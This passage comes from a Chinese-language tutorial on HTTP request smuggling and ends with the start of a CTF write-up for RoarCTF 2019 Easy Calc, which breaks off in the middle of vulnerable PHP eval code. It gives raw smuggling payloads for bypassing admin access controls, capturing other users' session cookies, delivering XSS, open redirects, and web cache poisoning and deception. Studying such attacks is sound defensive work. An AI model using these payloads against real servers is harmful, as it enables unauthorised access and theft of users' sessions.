+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/404</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>146</span><br><span class="line"></span><br><span class="line"><span class="language-nix">x<span class="operator">=</span></span></span><br><span class="line"><span class="language-nix"><span class="number">0</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">POST <span class="symbol">/search</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> vulnerable-website.com</span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> application<span class="symbol">/x-www-form-urlencoded</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Length:</span> <span class="number">11</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"><span class="attr">q</span><span class="operator">=</span>smuggling</span></span><br></pre></td></tr></table></figure></div>
+<p>服务器将以状态代码 404 进行响应，这表明攻击请求确实干扰了它。</p>
+<h1 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h1><h2 id="绕过前端安全控制"><a href="#绕过前端安全控制" class="headerlink" title="绕过前端安全控制"></a>绕过前端安全控制</h2><p>例如，假设应用程序使用前端服务器实现访问控制限制，仅当用户有权访问请求的 URL 时，才转发请求。然后，后端服务器将接受每个请求，而不进行进一步检查。在这种情况下，HTTP 请求走私漏洞可用于绕过访问控制，方法是将请求走私到受限制的 URL。</p>
+<p>假设允许当前用户访问 &#x2F;home，但不能访问 &#x2F;admin。他们可以使用以下请求走私攻击来绕过此限制：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/home</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>62</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">0</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/admin</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> vulnerable-website.com</span></span><br><span class="line"><span class="language-nix"><span class="params">Foo:</span> xGET <span class="symbol">/home</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> vulnerable-website.com</span></span><br></pre></td></tr></table></figure></div>
+
+<p>前端服务器在此处看到两个请求，两个请求都是针对 &#x2F;home的，因此这些请求被转发到后端服务器。但是，后端服务器会看到一个 &#x2F;home 请求和一个 &#x2F;admin 请求。它假定（一如既往）请求已通过前端控件，因此授予对受限 URL 的访问权限。</p>
+<h2 id="显示前端请求重写"><a href="#显示前端请求重写" class="headerlink" title="显示前端请求重写"></a>显示前端请求重写</h2><p>在许多应用程序中，前端服务器在将请求转发到后端服务器之前会执行一些请求重写，通常是通过添加一些额外的请求标头。例如，前端服务器可能：</p>
+<ul>
+<li>终止 TLS 连接并添加一些描述所用协议和密码的标头;</li>
+<li>添加包含用户 IP 地址的 X-Forwarded-For 标头;</li>
+<li>根据用户的会话令牌确定用户的 ID，并添加标识用户的标头;</li>
+<li>添加一些其他攻击感兴趣的敏感信息。</li>
+</ul>
+<p>假设应用程序具有反映 email 参数值的 login 函数：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>28</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">email</span>=wiener@normal-user.net</span></span><br></pre></td></tr></table></figure></div>
+<p>生成的内容响应</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="attribute">id</span>=<span class="string">&quot;email&quot;</span> <span class="attribute">value</span>=<span class="string">&quot;wiener@normal-user.net&quot;</span> <span class="attribute">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>
+<p>可以用下面的攻击揭示前端服务器执行的重写：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>130</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">0</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">POST <span class="symbol">/login</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> vulnerable-website.com</span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> application<span class="symbol">/x-www-form-urlencoded</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Length:</span> <span class="number">100</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"><span class="attr">email</span><span class="operator">=</span>POST <span class="symbol">/login</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> vulnerable-website.com</span></span><br><span class="line"><span class="language-nix">...</span></span><br></pre></td></tr></table></figure></div>
+<p>前端服务器将重写请求以包含其他标头，然后后端服务器将处理走私请求，并将重写的第二个请求视为 email 参数的值。然后，它会在对第二个请求的响应中反映此值：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NESTEDTEXT"><figure class="iseeu highlight /nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">&lt;input id=&quot;email&quot; value=&quot;POST /login HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">:</span> <span class="string">vulnerable-website.com</span></span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">:</span> <span class="string">1.3.3.7</span></span><br><span class="line"><span class="attribute">X-Forwarded-Proto</span><span class="punctuation">:</span> <span class="string">https</span></span><br><span class="line"><span class="attribute">X-TLS-Bits</span><span class="punctuation">:</span> <span class="string">128</span></span><br><span class="line"><span class="attribute">X-TLS-Cipher</span><span class="punctuation">:</span> <span class="string">ECDHE-RSA-AES128-GCM-SHA256</span></span><br><span class="line"><span class="attribute">X-TLS-Version</span><span class="punctuation">:</span> <span class="string">TLSv1.2</span></span><br><span class="line"><span class="attribute">x-nr-external-service</span><span class="punctuation">:</span> <span class="string">external</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+<p>一旦揭示了前端服务器如何重写请求，就可以对走私请求应用必要的重写，以确保后端服务器按预期方式处理这些请求。</p>
+<h2 id="绕过客户端身份验证"><a href="#绕过客户端身份验证" class="headerlink" title="绕过客户端身份验证"></a>绕过客户端身份验证</h2><p>作为 TLS 握手的一部分，服务器通过提供证书向客户端（通常是浏览器）验证自身身份。此证书包含其“公用名”（CN），该名称应与其注册的主机名匹配。然后，客户端可以使用它来验证他们是否正在与属于预期域的合法服务器通信。</p>
+<p>一些站点更进一步，实现了一种相互 TLS 身份验证形式，其中客户端还必须向服务器提供证书。在这种情况下，客户端的 CN 通常是用户名或类似的东西，例如，它可以作为访问控制机制的一部分在后端应用程序逻辑中使用。</p>
+<p>对客户端进行身份验证的组件通常通过一个或多个非标准 HTTP 标头将相关详细信息从证书传递到应用程序或后端服务器。例如，前端服务器有时会将包含客户端 CN 的标头附加到任何传入请求：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line"><span class="attribute">X-SSL-CLIENT-CN</span><span class="punctuation">: </span>carlos</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="捕获其他用户的请求"><a href="#捕获其他用户的请求" class="headerlink" title="捕获其他用户的请求"></a>捕获其他用户的请求</h2><p>如果应用程序包含任何类型的功能，允许 存储和稍后检索文本数据，则可能会使用它来捕获其他用户请求的内容。这些可能包括用户提交的会话令牌或其他敏感数据。用作此攻击工具的合适功能是评论、电子邮件、配置文件描述、屏幕名称等。</p>
+<p>要执行攻击， 需要走私一个将数据提交到 storage 函数的请求，其中包含要存储的数据的参数位于请求的最后。例如，假设应用程序使用以下请求提交博客文章评论，该评论将被存储并显示在博客上：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/post/comment</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>154</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">csrf</span>=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&amp;postId=<span class="number">2</span>&amp;comment=My+comment&amp;name=Carlos+Montoya&amp;email=carlos%<span class="number">40</span>normal-user.net&amp;website=https%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fnormal-user.net</span></span><br></pre></td></tr></table></figure></div>
+<p>现在考虑一下，如果 走私一个等效请求，其中包含过长的 Content-Length 标头，并且 comment 参数位于请求末尾，如下所示：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>330</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">POST</span> /post/comment HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: vulnerable-website.com</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">400</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Cookie</span>: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">csrf</span>=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&amp;postId=<span class="number">2</span>&amp;name=Carlos+Montoya&amp;email=carlos%<span class="number">40</span>normal-user.net&amp;website=https%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fnormal-user.net&amp;comment=</span></span><br></pre></td></tr></table></figure></div>
+<p>走私请求的 Content-Length 标头指示正文长度为 400 字节，但我们只发送了 144 字节。在这种情况下，后端服务器将等待剩余的 256 字节，然后再发出响应，或者如果响应速度不够快，则会发出超时。因此，当通过同一连接将另一个请求发送到后端服务器时，前 256 字节将有效地附加到走私请求中</p>
+<p>要捕获受害者的更多请求， 只需相应地增加走私请求的 Content-Length 标头的值，但请注意，这将涉及一定量的试验和错误。如果 遇到超时，这可能意味着 指定的 Content-Length 高于受害者请求的实际长度。在这种情况下，只需减小该值，直到攻击再次起作用。</p>
+<h2 id="利用反射型XSS"><a href="#利用反射型XSS" class="headerlink" title="利用反射型XSS"></a>利用反射型XSS</h2><p>如果应用程序容易受到 HTTP 请求走私的攻击，并且还包含反射型 XSS，则可以使用请求走私攻击来攻击应用程序的其他用户。这种方法在两个方面优于对反射型 XSS 的正常利用：<br>它不需要与受害者用户交互。 无需向他们提供 URL 并等待他们访问它。 只需走私一个包含 XSS 有效负载的请求，后端服务器处理的下一个用户请求就会被命中。<br>它可用于利用请求中在正常反射型 XSS 攻击中无法轻松控制的部分的 XSS 行为，例如 HTTP 请求标头。<br>例如，假设应用程序在 User-Agent 标头中具有反射的 XSS 漏洞。 可以在请求走私攻击中利用此漏洞，如下所示：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>63</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">0</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">User-Agent:</span> <span class="symbol">&lt;script&gt;</span>alert(<span class="number">1</span>)<span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Foo:</span> X</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="将现场重定向转换为开放重定向"><a href="#将现场重定向转换为开放重定向" class="headerlink" title="将现场重定向转换为开放重定向"></a>将现场重定向转换为开放重定向</h2><p>一个重定向请求</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/home</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently</span></span><br><span class="line"><span class="language-http"><span class="attribute">Location</span><span class="punctuation">: </span>https://normal-website.com/home/</span></span><br></pre></td></tr></table></figure></div>
+
+<p>此行为通常被认为是无害的，但可以在请求走私攻击中被利用，将其他用户重定向到外部域。例如：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>54</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">0</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/home</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> attacker-website.com</span></span><br><span class="line"><span class="language-nix"><span class="params">Foo:</span> X</span></span><br></pre></td></tr></table></figure></div>
+<p>走私的请求会触发重定向到攻击者的网站，这将影响到后端服务器处理的下一个用户的请求。例如：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/home</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>attacker-website.com</span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span>XGET /scripts/include.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently</span></span><br><span class="line"><span class="language-http"><span class="attribute">Location</span><span class="punctuation">: </span>https://attacker-website.com/home/</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="使用-HTTP-请求走私执行-Web-缓存中毒"><a href="#使用-HTTP-请求走私执行-Web-缓存中毒" class="headerlink" title="使用 HTTP 请求走私执行 Web 缓存中毒"></a>使用 HTTP 请求走私执行 Web 缓存中毒</h2><p>在上述攻击的变体中，有可能利用 HTTP 请求走私来执行 Web 缓存中毒攻击。如果前端基础设施的任何部分执行内容缓存（通常是出于性能原因），则可能会使用场外重定向响应来毒害缓存。这将使攻击持续存在，影响随后请求受影响 URL 的任何用户。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>59</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">0</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/home</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> attacker-website.com</span></span><br><span class="line"><span class="language-nix"><span class="params">Foo:</span> XGET <span class="symbol">/static/include.js</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> vulnerable-website.com</span></span><br></pre></td></tr></table></figure></div>
+<p>走私请求到达后端服务器，后端服务器像以前一样使用场外重定向进行响应。前端服务器根据它认为是第二个请求中的 URL（即 &#x2F;static&#x2F;include.js）缓存此响应：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/static/include.js</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently</span></span><br><span class="line"><span class="language-http"><span class="attribute">Location</span><span class="punctuation">: </span>https://attacker-website.com/home/</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="使用-HTTP-请求走私执行-Web-缓存欺骗"><a href="#使用-HTTP-请求走私执行-Web-缓存欺骗" class="headerlink" title="使用 HTTP 请求走私执行 Web 缓存欺骗"></a>使用 HTTP 请求走私执行 Web 缓存欺骗</h2><p>在攻击的另一种变体中， 可以利用 HTTP 请求走私来执行 Web 缓存欺骗。其工作方式与 Web 缓存中毒攻击类似，但目的不同。<br>Web 缓存中毒和 Web 缓存欺骗有什么区别？</p>
+<ul>
+<li>在 Web 缓存中毒中，攻击者会导致应用程序在缓存中存储一些恶意内容，并将这些内容从缓存提供给其他应用程序用户。</li>
+<li>在 Web 缓存欺骗中，攻击者使应用程序在缓存中存储一些属于其他用户的敏感内容，然后攻击者从缓存中检索这些内容。<br>在此变体中，攻击者走私一个请求，该请求返回一些敏感的用户特定内容。例如</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>43</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">0</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/private/messages</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Foo:</span> X</span></span><br></pre></td></tr></table></figure></div>
+<p>来自另一个用户转发到后端服务器的下一个请求将附加到走私请求中，包括会话 Cookie 和其他标头。例如：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="symbol">/private/messages</span> HTTP<span class="symbol">/1.1</span></span><br><span class="line"><span class="params">Foo:</span> XGET <span class="symbol">/static/some-image.png</span> HTTP<span class="symbol">/1.1</span></span><br><span class="line"><span class="params">Host:</span> vulnerable-website.com</span><br><span class="line"><span class="params">Cookie:</span> sessionId<span class="operator">=</span>q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+
+<p>这里需要注意的一个重要问题是，攻击者不知道缓存敏感内容所针对的 URL，因为这将是受害用户在走私请求生效时碰巧请求的任何 URL。攻击者可能需要获取大量静态 URL 才能发现捕获的内容。</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a><code>[RoarCTF 2019]Easy Calc</code></h2><p>查看一下页面源代码<br><img src="https://pic1.imgdb.cn/item/67dc2fb688c538a9b5c2184d.png"><br>这里有出现一个calc.php的页面提示，访问之后得到源码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span 